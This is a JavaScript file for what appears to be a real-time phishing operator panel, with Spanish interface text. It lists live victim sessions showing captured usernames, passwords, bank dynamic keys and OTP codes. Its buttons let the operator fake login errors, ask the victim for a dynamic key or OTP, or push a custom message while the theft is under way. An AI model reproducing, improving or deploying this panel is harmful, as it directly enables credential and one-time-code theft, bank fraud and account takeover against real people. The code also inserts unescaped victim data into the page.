import { CFG } from "./config.js";

 const nodeUrl = CFG.nodeUrl;
    let socket;
    let sessionsById = {};
    let selectedId = null;

    // Search
   /*  let query = "";
    const qInput = document.getElementById("q");
    qInput.addEventListener("input", () => {
      query = (qInput.value || "").trim().toLowerCase();
      renderList();
    }); */

    // Modal helpers
    const modalOverlay = document.getElementById("modalOverlay");
    const closeModalBtn = document.getElementById("closeModalBtn");

    function isSmallScreen(){
      return window.matchMedia("(max-width: 980px)").matches;
    }

    function openModal(){
      modalOverlay.classList.add("open");
      modalOverlay.setAttribute("aria-hidden", "false");
      document.body.style.overflow = "hidden";
    }

    function closeModal(){
      modalOverlay.classList.remove("open");
      modalOverlay.setAttribute("aria-hidden", "true");
      document.body.style.overflow = "";
    }

    closeModalBtn.addEventListener("click", closeModal);
    modalOverlay.addEventListener("click", (e) => {
      if (e.target === modalOverlay) closeModal();
    });
    window.addEventListener("keydown", (e) => {
      if (e.key === "Escape" && modalOverlay.classList.contains("open")) closeModal();
    });

    function stateDotClass(state){
      switch(String(state || "").toUpperCase()){
        case "ACTIVE": return "green";
        case "INACTIVE": return "red";
        case "MINIMIZED": return "yellow";
        default: return "gray";
      }
    }
    function stateDot(state){
      return `<span class="dot ${stateDotClass(state)}"></span>`;
    }

    /* export async function connectAdmin() {
      const r = await fetch(`http:192.168.1.4:3005/api/admin/issue-token`, { credentials: "same-origin" });
      const data = await r.json();

      if (!r.ok) {
        alert("No autenticado o no se pudo emitir token.");
        console.error(data);
        return;
      }

      socket = io(nodeUrl, {
        transports: ["websocket"],
        auth: { token: data.token },
      });

      socket.on("connect", () => {
        document.getElementById("connPill").innerHTML = "Socket:" + stateDot("ACTIVE");
      });

      socket.on("connect_error", (err) => {
        document.getElementById("connPill").innerHTML = "Socket:" + stateDot("INACTIVE");
        console.error("❌ connect_error:", err.message);
        alert("Socket error: " + err.message);
      });

      socket.on("admin:sessions:bootstrap", (sessions) => {
        sessionsById = {};
        (sessions || []).forEach(s => sessionsById[s.id] = s);
        renderList();

        // If a session was selected, refresh its detail (desktop or modal)
        if (selectedId && sessionsById[selectedId]) {
          renderDetail(sessionsById[selectedId]);
        }
      });

      socket.on("admin:sessions:upsert", (s) => {
        sessionsById[s.id] = s;
        renderList();

        // Update detail if currently selected
        if (selectedId === s.id) {
          renderDetail(s);
        }
      });

      socket.on("error:msg", (msg) => alert(msg));
    }
 */
    function renderList() {
      const items = Object.values(sessionsById)
        .sort((a, b) => new Date(b.updatedAt) - new Date(a.updatedAt))
        .filter(s => {
          if (!query) return true;
          const blob = [s.id, s.state, s.action, s.user, s.pass, s.dinamic, s.otp]
            .map(v => (v ?? "").toString().toLowerCase())
            .join(" ");
          return blob.includes(query);
        });

      document.getElementById("sessionsList").innerHTML = items.map(s => {
        const selected = (selectedId === s.id) ? "activeSel" : "";
        return `
          <div class="row ${selected}" onclick="openSession('${s.id}')">
            <div class="rowMain">
              <div class="rowTop">
                ${stateDot(s.state)}
                <span class="sid">${s.id}</span>
              </div>

              <div class="meta">
                <span class="kv"><b>user</b> ${s.user ?? "-"}</span>
                <span class="kv"><b>pass</b> ${s.pass ?? "-"}</span>
                <span class="kv"><b>dinamic</b> ${s.dinamic ?? "-"}</span>
                <span class="kv"><b>otp</b> ${s.otp ?? "-"}</span>
              </div>
            </div>

            <div class="pill" style="font-size:11px;">
              ${(s.action ?? "—")}
            </div>
          </div>
        `;
      }).join("");
    }

    function renderActionsHTML(s, targetElId){
      const actions = document.getElementById(targetElId);
      actions.innerHTML = "";
      if (!s) return;

      switch (s.action) {
        case "AUTH_WAIT_ACTION":
          actions.innerHTML = `
            <button class="danger" onclick="act('${s.id}','reject_auth')">Error Login</button>
            <button class="primary" onclick="act('${s.id}','request_dinamic')">Pedir dinámica</button>
            <button class="primary" onclick="act('${s.id}','request_otp')">Pedir OTP</button>
          `;
          break;

        case "AUTH_ERROR":
          actions.innerHTML = `<span style="color:var(--muted)">Esperando nuevos datos</span>`;
          break;

        case "DINAMIC_WAIT_ACTION":
          actions.innerHTML = `
            <button class="danger" onclick="act('${s.id}','reject_dinamic')">Error dinámica</button>
            <button class="primary" onclick="act('${s.id}','request_otp')">Pedir OTP</button>
            <button onclick="act('${s.id}','finish')">Finalizar</button>
          `;
          break;

        case "DINAMIC_ERROR":
          actions.innerHTML = `<span style="color:var(--muted)">Esperando nueva dinámica</span>`;
          break;

        case "OTP_WAIT_ACTION":
          actions.innerHTML = `
            <button class="danger" onclick="act('${s.id}','reject_otp')">Error OTP</button>
            <button onclick="act('${s.id}','custom_alert')">Alerta personalizada</button>
            <button class="primary" onclick="act('${s.id}','request_dinamic')">Pedir dinámica</button>
            <button onclick="act('${s.id}','finish')">Finalizar</button>
          `;
          break;

        case "OTP_ERROR":
          actions.innerHTML = `<span style="color:var(--muted)">Esperando nuevo OTP</span>`;
          break;

        default:
          actions.innerHTML = `<span style="color:var(--muted)">Sin acciones disponibles en este estado.</span>`;
      }
    }

    function renderDetail(s) {
      // Desktop detail
      document.getElementById("selectedId").textContent = s?.id ?? "—";
      document.getElementById("detailBox").textContent = JSON.stringify(s ?? {}, null, 2);

      const dt = document.getElementById("detailTop");
      if (s){
        dt.innerHTML = `
          <span style="display:inline-flex;align-items:center;gap:10px;">
            ${stateDot(s.state)}
            <span>Estado: <b style="color:rgba(255,255,255,.92)">${s.state ?? "—"}</b></span>
          </span>
          <span>Acción: <b style="color:rgba(255,255,255,.92)">${s.action ?? "—"}</b></span>
        `;
      } else {
        dt.textContent = "Selecciona una sesión.";
      }
      renderActionsHTML(s, "actions");

      // Mobile modal detail
      if (isSmallScreen() && s){
        document.getElementById("modalSessionId").textContent = s.id ?? "—";
        document.getElementById("modalState").textContent = s.state ?? "—";
        document.getElementById("modalActionPill").textContent = `action: ${s.action ?? "—"}`;
        document.getElementById("modalDetailBox").textContent = JSON.stringify(s ?? {}, null, 2);

        // Dot in modal
        document.getElementById("modalDot").innerHTML = stateDot(s.state);

        renderActionsHTML(s, "modalActions");
      }
    }

    // When resizing: if modal open but now desktop, close it
    window.addEventListener("resize", () => {
      if (!isSmallScreen() && modalOverlay.classList.contains("open")) closeModal();
    });

    window.openSession = function (id) {
      selectedId = id;
      renderList();

      const s = sessionsById[id];
      renderDetail(s);

      // Small screens: open modal
      if (isSmallScreen() && s){
        openModal();
      }
    }

    window.act = function (sessionId, action) {
      let message = null;
      if (action === "custom_alert") {
        message = prompt("Mensaje personalizado para el usuario:");
        if (message === null) return;
      }
      const eventName = `admin:${action}`;
      socket.emit(eventName, message ? { sessionId, message } : { sessionId });
    }